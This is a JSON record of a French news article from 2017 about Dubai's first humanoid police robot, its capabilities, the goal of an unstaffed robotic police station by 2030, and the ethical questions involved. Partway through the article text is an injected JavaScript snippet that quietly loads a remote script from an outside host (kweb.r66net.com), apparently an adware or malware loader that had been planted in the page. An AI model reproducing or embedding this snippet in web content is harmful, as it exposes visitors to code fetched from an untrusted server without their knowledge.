{"title": "Robot policier : le premier Robocop commence a patrouiller a Dubai", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-05-26", "content": "A Dubai, les forces de police viennent d'accueillir le tout premier robot humanoide qui sera deploye dans les centres commerciaux et les parcs d'attraction. Parlant neuf langues, il pourra converser avec les humains, mais dans des domaines plutot restreints : leur permettre de signaler un delit et... payer leurs contraventions. Ceci n'est la, nous promet-on, que le debut d'un projet bien plus ambitieux. Ce qu'il faut retenir Dubai est le premier pays a mettre en service un robot policier humanoide. La ville compte se doter d'un commissariat entierement robotise en 2030. La police de Dubai (Emirats arabes unis) vient d'accueillir un nouveau membre parmi ses troupes. Il s'agit d'un  robot  policier humanoide, le premier du genre a entrer en service actif sur la planete. Ce Robocop, qui mesure 1,70 metre pour 100  kilogrammes , se deplace sur roues grace a un systeme de navigation autonome. Il peut saluer et converser en neuf langues mais aussi detecter les emotions sur les visages et reconnaitre des gestes des mains a 1,5 metre de distance. Pour creer ce  robot , la police de Dubai a fait appel a la societe espagnole Pal Robotics. C'est elle qui est a l'origine du robot humanoide super-bricoleur  Pyrene , codeveloppe avec les roboticiens du LAAS CNRS. La base technologique est donc la meme, mais la version Robocop a ete adaptee avec des fonctions plus specifiques. Muni d'une  tablette  tactile inseree au niveau de son torse, le robot permettra notamment de regler des contraventions, de signaler un delit et d'entrer en contact avec des forces de police en cas de probleme. Et comme on pouvait s'en douter, ses yeux-cameras peuvent filmer et transmettre en direct tout ce qu'il se passe.  Dubai veut creer un robot policier capable de faire le meme travail qu'un humain, ce qui souleve de nombreuses questions sur les limites et les risques d'une telle experience. (c) Dubai Media Office                               Dubai veut un commissariat 100 % Robocop en 2030 Selon les explications fournies a  CNN  par le brigadier Khalid Nasser Alrazooqi, directeur general du departement des objets intelligents pour la police de Dubai, l' intelligence artificielle  Watson d' IBM  ainsi que  Google  sont impliques dans le developpement de ce Robocop. Dans un premier temps, ce robot policier sera deploye dans des centres commerciaux et des parcs d'attraction avant d'integrer des commissariats de police ou il fera office de receptionniste.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais tout ceci n'est qu'un debut. En effet, a terme, Dubai veut se doter d'un  robot  capable de faire le meme travail qu'un officier de police humain. Un premier prototype fonctionnel pourrait etre devoile a l'occasion de l'exposition universelle qui se tiendra dans la ville en 2020. << En 2030, nous aurons le premier commissariat de police qui ne necessitera aucun employe humain >> , a assure le brigadier Alrazooqi. Cela supposerait donc que de tels  robots  policiers soient capables d'interpeller et de detenir des personnes ayant commis une infraction ou un crime.  Une perspective qui souleve d'importantes questions ethiques mais interroge aussi sur la maniere de determiner la responsabilite en cas d'erreur de la machine. Creer une intelligence artificielle a la fois assez autonome pour pouvoir decider de represailles adaptees envers une personne menacante et suffisamment encadree pour eviter les bavures est un defi extremement complexe et risque. En pourra toujours se rassurer en sachant que Dubai ne prevoit pas d'armer ses futurs robots policiers. Mais la question se posera forcement tot ou tard... Spot, le robot quadrupede de Boston Dynamics                       Decouvrez Spot, l'un des robots de Boston Dynamics. Ce prototype qui ressemble a un gros chien se deplace avec une etonnante agilite et garde meme l'equilibre apres un coup de pied, la preuve en video !                                       ", "theme": "tech"}